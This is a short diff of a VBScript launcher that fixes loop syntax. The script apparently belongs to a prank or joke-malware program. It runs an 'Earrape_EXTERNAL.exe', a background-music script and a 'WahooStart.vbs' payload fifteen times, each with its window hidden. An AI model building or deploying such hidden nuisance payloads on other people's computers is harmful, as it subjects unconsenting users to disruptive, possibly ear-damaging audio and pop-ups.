@@ -9,8 +9,8 @@ ws.Run ".\Payloads\Earrape\Earrape_EXTERNAL.exe", 0
 wscript.sleep 6600
 ws.Run "wscript .\Payloads\PlayBGM\PlayBGM.vbs", 0
 wscript.sleep 1500
-i = 0
+i=0
 do
 ws.Run "wscript .\Payloads\Wahoo\WahooStart.vbs", 0
-i += 1
+i=i+1
 loop while i<>15
